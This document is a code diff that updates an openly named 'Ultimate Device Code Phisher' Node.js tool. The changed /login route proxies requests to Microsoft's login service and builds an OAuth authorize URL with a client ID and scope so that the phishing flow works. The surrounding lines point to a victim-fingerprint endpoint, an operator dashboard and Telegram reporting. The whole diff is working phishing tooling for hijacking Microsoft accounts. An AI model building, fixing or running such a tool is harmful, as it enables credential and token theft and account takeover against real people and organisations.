@@ -1,7 +1,7 @@
 // ============================================================
-// 🥔 ULTIMATE DEVICE CODE PHISHER v5.4.4 – Content‑Type Fixed
+// 🥔 ULTIMATE DEVICE CODE PHISHER v5.4.5 – Query String Fix
 // ============================================================
-// Fixed AADSTS900144 by preserving raw body and Content‑Type header.
+// Fixed initial GET request by adding client_id to the URL.
 // ============================================================
 
 const http = require('http');
@@ -654,7 +654,18 @@ app.post('/device/fingerprint', (req, res) => {
 app.all('/login*', async (req, res) => {
     const targetBase = 'https://login.microsoftonline.com';
     let targetPath = req.url.replace(/^\/login/, '');
-    if (!targetPath || targetPath === '/') targetPath = '/common/oauth2/v2.0/authorize';
+    
+    // 🔥 CRITICAL FIX: Rewrite GET requests to root /login to the authorize endpoint with CLIENT_ID
+    const method = req.method;
+    if (method === 'GET' && (!targetPath || targetPath === '/' || targetPath === '' || targetPath.startsWith('?'))) {
+        const params = new URLSearchParams({
+            client_id: CLIENT_ID,
+            response_type: 'code',
+            redirect_uri: 'https://login.microsoftonline.com/common/oauth2/nativeclient',
+            scope: SCOPE
+        });
+        targetPath = '/common/oauth2/v2.0/authorize?' + params.toString();
+    }
     const targetUrl = targetBase + targetPath;
 
     const headers = { ...req.headers };
@@ -663,7 +674,6 @@ app.all('/login*', async (req, res) => {
     delete headers['transfer-encoding'];
     headers['Host'] = 'login.microsoftonline.com';
 
-    const method = req.method;
     let bodyData = null;
 
     // 🔥 Use the raw body we captured earlier (guaranteed not stripped)
@@ -1035,7 +1045,7 @@ server.on('upgrade', (req, socket, head) => {
     if (req.url === '/ws') { wsServer.handleUpgrade(req, socket, head, (ws) => { wsServer.emit('connection', ws, req); }); } else { socket.destroy(); }
 });
 server.listen(PORT, '0.0.0.0', () => {
-    console.log(`✅ Ultimate Device Phisher v5.4.4 – Content‑Type Fixed running on port ${PORT}`);
+    console.log(`✅ Ultimate Device Phisher v5.4.5 – Query String Fix running on port ${PORT}`);
     console.log(`📱 Device page: http://localhost:${PORT}/device`);
     console.log(`📊 Dashboard: http://localhost:${PORT}/dash`);
     console.log(`🔧 Telegram: ${BOT_TOKEN ? 'ACTIVE' : 'DISABLED'}`);
